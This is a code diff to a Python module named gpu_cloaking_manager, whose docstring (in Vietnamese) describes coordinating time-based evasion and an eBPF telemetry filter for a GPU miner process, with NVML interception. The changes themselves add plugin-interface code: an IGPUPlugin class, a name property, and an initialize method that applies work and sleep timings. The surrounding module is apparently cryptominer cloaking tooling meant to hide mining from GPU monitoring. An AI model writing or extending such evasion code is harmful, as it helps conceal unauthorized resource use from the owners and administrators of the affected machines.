@@ -35,6 +35,14 @@ import subprocess
 from pathlib import Path
 from typing import Optional, Dict, Any
 
+# ✅ LAYER 1: Import IGPUPlugin interface
+try:
+    from ..core.interfaces import IGPUPlugin
+except ImportError:
+    # Fallback nếu không có interface
+    class IGPUPlugin:
+        pass
+
 try:
     import ctypes
 except ImportError:
@@ -77,8 +85,11 @@ logging.basicConfig(
 logger = logging.getLogger('gpu_cloaking_manager')
 
 # ---------- helper class ----------
-class GPUCloakingManager:
-    """Điều phối Time-based Evasion và eBPF Telemetry Filter cho một process GPU miner."""
+class GPUCloakingManager(IGPUPlugin):
+    """Điều phối Time-based Evasion và eBPF Telemetry Filter cho một process GPU miner.
+    
+    ✅ LAYER 1: Implements IGPUPlugin interface for proper plugin registration.
+    """
 
     def __init__(self, target_pid: int, work_ms: Optional[int] = None, sleep_ms: Optional[int] = None, 
                  stop_event: Optional[threading.Event] = None, ebpf_config_path: Optional[str] = None):
@@ -106,6 +117,38 @@ class GPUCloakingManager:
         
         # Khởi tạo biến môi trường cho NVML interception
         self._initialize_nvml_interception()
+
+    # ========== 🔧 LAYER 1: IGPUPlugin Interface Implementation ==========
+    @property 
+    def name(self) -> str:
+        """Tên của plugin"""
+        return "time_based_manager"
+    
+    def initialize(self, config: Dict[str, Any]) -> bool:
+        """Khởi tạo plugin với cấu hình
+        
+        Args:
+            config: Dictionary chứa cấu hình plugin
+            
+        Returns:
+            bool: True nếu khởi tạo thành công
+        """
+        try:
+            # Update configuration từ config dict
+            self.work_ms = config.get('work_ms', self.work_ms)
+            self.sleep_ms = config.get('sleep_ms', self.sleep_ms)
+            
+            # Initialize NVML interception với config
+            nvml_success = self._initialize_nvml_interception()
+            
+            logger.info(f"✅ [LAYER1] time_based_manager initialized: work_ms={self.work_ms}, sleep_ms={self.sleep_ms}, nvml={nvml_success}")
+            return True
+            
+        except Exception as e:
+            logger.error(f"❌ [LAYER1] time_based_manager initialization failed: {e}")
+            return False
+
+    # ========== End IGPUPlugin Interface Implementation ==========
 
     # ---------------- NVML Interception -----------------
     def _initialize_nvml_interception(self) -> bool:
